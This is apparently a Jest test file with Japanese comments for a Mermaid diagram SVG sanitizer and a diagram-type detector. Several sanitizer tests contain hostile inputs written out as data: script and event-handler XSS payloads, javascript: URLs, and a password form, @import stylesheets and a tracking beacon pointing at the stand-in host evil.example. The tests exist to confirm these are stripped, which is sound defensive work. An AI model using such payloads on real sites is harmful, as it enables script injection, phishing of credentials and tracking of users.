/**
 * useMermaidRender.ts のテスト
 * SVG_SANITIZE_CONFIG 定数と detectMermaidType 関数をテスト
 */
import { SVG_SANITIZE_CONFIG, detectMermaidType, sanitizeMermaidSvg } from "../hooks/useMermaidRender";

/** mermaid v11 が flowchart ノードラベルに出力する foreignObject 構造 */
const MERMAID_NODE_LABEL_SVG = [
  '<svg xmlns="http://www.w3.org/2000/svg">',
  '<g class="node"><rect width="100" height="40"></rect>',
  '<g class="label"><foreignObject width="80" height="24">',
  '<div xmlns="http://www.w3.org/1999/xhtml" style="display:inline-block">',
  '<span class="nodeLabel"><p>ラベルA</p></span>',
  "</div></foreignObject></g></g></svg>",
].join("");

/** foreignObject 内に任意の HTML を埋め込んだ攻撃入力を組み立てる */
function foreignObjectHtml(inner: string): string {
  return [
    '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject>',
    '<div xmlns="http://www.w3.org/1999/xhtml">',
    inner,
    "</div></foreignObject></svg>",
  ].join("");
}

describe("SVG_SANITIZE_CONFIG sanitize 結果", () => {
  it("foreignObject 内の HTML ラベルを保持する", () => {
    const sanitized = sanitizeMermaidSvg(MERMAID_NODE_LABEL_SVG);

    expect(sanitized).toContain("ラベルA");
    expect(sanitized).toContain('class="nodeLabel"');
  });

  it("ラベル内のインライン整形タグ（br / em / strong）を保持する", () => {
    const sanitized = sanitizeMermaidSvg(foreignObjectHtml("<p>1行目<br/>2行目<em>強調</em><strong>太字</strong></p>"));

    expect(sanitized).toContain("<br>");
    expect(sanitized).toContain("<em>強調</em>");
    expect(sanitized).toContain("<strong>太字</strong>");
  });

  it("foreignObject 内のスクリプト・イベントハンドラ・javascript: URL を除去する", () => {
    const sanitized = sanitizeMermaidSvg(foreignObjectHtml(
        [
          "<script>alert(1)</script>",
          '<img src="x" onerror="alert(1)">',
          '<p onclick="steal()">ok</p>',
          '<a href="javascript:alert(1)">l</a>',
          '<iframe src="x"></iframe>',
        ].join(""),
      ));

    expect(sanitized).toContain("ok");
    expect(sanitized).not.toContain("alert");
    expect(sanitized).not.toContain("onerror");
    expect(sanitized).not.toContain("onclick");
    expect(sanitized).not.toContain("javascript:");
    expect(sanitized).not.toContain("<script");
    expect(sanitized).not.toContain("<iframe");
  });

  it("foreignObject 内のフォーム要素を除去する（ラベルを装ったフィッシングを防ぐ）", () => {
    const sanitized = sanitizeMermaidSvg(foreignObjectHtml(
        '<form action="https://evil.example/collect"><input type="password" name="pw"><button>Submit</button></form>',
      ));

    expect(sanitized).not.toContain("<form");
    expect(sanitized).not.toContain("<input");
    expect(sanitized).not.toContain("<button");
    expect(sanitized).not.toContain("evil.example");
  });

  it("foreignObject 内の style 要素を除去する（@import 経由の外部通信を防ぐ）", () => {
    const sanitized = sanitizeMermaidSvg(foreignObjectHtml("<style>@import url(https://evil.example/x.css);</style>"));

    expect(sanitized).not.toContain("<style");
    expect(sanitized).not.toContain("@import");
    expect(sanitized).not.toContain("evil.example");
  });

  it("foreignObject 内で入れ子・SVG 配下に隠した style も除去する", () => {
    const nested = sanitizeMermaidSvg(
      foreignObjectHtml("<div><section><style>@import url(https://evil.example/x.css);</style></section></div>"),
    );
    const insideSvg = sanitizeMermaidSvg(
      foreignObjectHtml('<svg xmlns="http://www.w3.org/2000/svg"><style>@import url(https://evil.example/y.css)</style></svg>'),
    );

    expect(nested).not.toContain("@import");
    expect(insideSvg).not.toContain("@import");
  });

  it("foreignObject 内の link 要素を除去する（外部スタイルシート読込を防ぐ）", () => {
    const sanitized = sanitizeMermaidSvg(
      foreignObjectHtml('<link rel="stylesheet" href="https://evil.example/x.css">'),
    );

    expect(sanitized).not.toContain("<link");
    expect(sanitized).not.toContain("evil.example");
  });

  // mermaid はラベル内の img を公式サポートしており、通常の Markdown 画像と同じ能力しか
  // 与えないため除去しない（脅威パリティ）
  it("ラベル内の img は保持する", () => {
    const sanitized = sanitizeMermaidSvg(foreignObjectHtml('<img src="https://example.com/icon.png">'));

    expect(sanitized).toContain("<img");
  });

  it("style 属性の外部 url(...) を剥がし、内部フラグメント参照は残す", () => {
    const beacon = sanitizeMermaidSvg(
      foreignObjectHtml('<p style="background:url(https://evil.example/track.png)">x</p>'),
    );
    const marker = sanitizeMermaidSvg(
      '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject></foreignObject>'
      + '<path style="marker-end:url(#arrowhead)"></path></svg>',
    );

    expect(beacon).not.toContain("evil.example");
    expect(beacon).toContain(">x<");
    expect(marker).toContain("url(#arrowhead)");
  });

  it("SVG 直下の style（mermaid のテーマ CSS）は保持する", () => {
    const themed = [
      '<svg xmlns="http://www.w3.org/2000/svg" id="mermaid-1">',
      "<style>#mermaid-1 .node rect{fill:#eee}</style>",
      '<g class="node"><rect></rect></g></svg>',
    ].join("");

    const sanitized = sanitizeMermaidSvg(themed);

    expect(sanitized).toContain("<style>");
    expect(sanitized).toContain("fill:#eee");
  });

  it("DOMPurify に渡しても設定オブジェクトが書き換わらない", () => {
    sanitizeMermaidSvg(MERMAID_NODE_LABEL_SVG);

    expect(SVG_SANITIZE_CONFIG.ADD_TAGS).toEqual(["foreignObject"]);
  });
});

describe("SVG_SANITIZE_CONFIG", () => {
  it("has expected USE_PROFILES", () => {
    expect(SVG_SANITIZE_CONFIG.USE_PROFILES).toEqual({
      svg: true,
      svgFilters: true,
      html: true,
    });
  });

  it("allows foreignObject tag", () => {
    expect(SVG_SANITIZE_CONFIG.ADD_TAGS).toContain("foreignObject");
  });

  it("forbids script tag", () => {
    expect(SVG_SANITIZE_CONFIG.FORBID_TAGS).toContain("script");
  });

  it("forbids iframe tag", () => {
    expect(SVG_SANITIZE_CONFIG.FORBID_TAGS).toContain("iframe");
  });

  it("forbids object and embed tags", () => {
    expect(SVG_SANITIZE_CONFIG.FORBID_TAGS).toContain("object");
    expect(SVG_SANITIZE_CONFIG.FORBID_TAGS).toContain("embed");
  });

  it("allows xmlns and style attributes", () => {
    expect(SVG_SANITIZE_CONFIG.ADD_ATTR).toContain("xmlns");
    expect(SVG_SANITIZE_CONFIG.ADD_ATTR).toContain("style");
    expect(SVG_SANITIZE_CONFIG.ADD_ATTR).toContain("class");
  });
});

describe("detectMermaidType", () => {
  it("detects flowchart from 'graph' keyword", () => {
    expect(detectMermaidType("graph TD\n  A-->B")).toBe("diagramFlowchart");
  });

  it("detects flowchart from 'flowchart' keyword", () => {
    expect(detectMermaidType("flowchart LR\n  A-->B")).toBe("diagramFlowchart");
  });

  it("detects sequence diagram", () => {
    expect(detectMermaidType("sequenceDiagram\n  A->>B: msg")).toBe("diagramSequence");
  });

  it("detects class diagram", () => {
    expect(detectMermaidType("classDiagram\n  Class01")).toBe("diagramClass");
  });

  it("detects state diagram", () => {
    expect(detectMermaidType("stateDiagram\n  [*] --> S1")).toBe("diagramState");
  });

  it("detects state diagram v2", () => {
    expect(detectMermaidType("stateDiagram-v2\n  [*] --> S1")).toBe("diagramState");
  });

  it("detects ER diagram", () => {
    expect(detectMermaidType("erDiagram\n  CUSTOMER")).toBe("diagramEr");
  });

  it("detects gantt chart", () => {
    expect(detectMermaidType("gantt\n  title A Gantt")).toBe("diagramGantt");
  });

  it("detects pie chart", () => {
    expect(detectMermaidType("pie\n  title Pets")).toBe("diagramPie");
  });

  it("detects mindmap", () => {
    expect(detectMermaidType("mindmap\n  root")).toBe("diagramMindmap");
  });

  it("returns generic for unknown type", () => {
    expect(detectMermaidType("unknown\n  content")).toBe("diagramGeneric");
  });

  it("handles leading whitespace", () => {
    expect(detectMermaidType("  graph TD\n  A-->B")).toBe("diagramFlowchart");
  });

  it("handles empty string", () => {
    expect(detectMermaidType("")).toBe("diagramGeneric");
  });
});
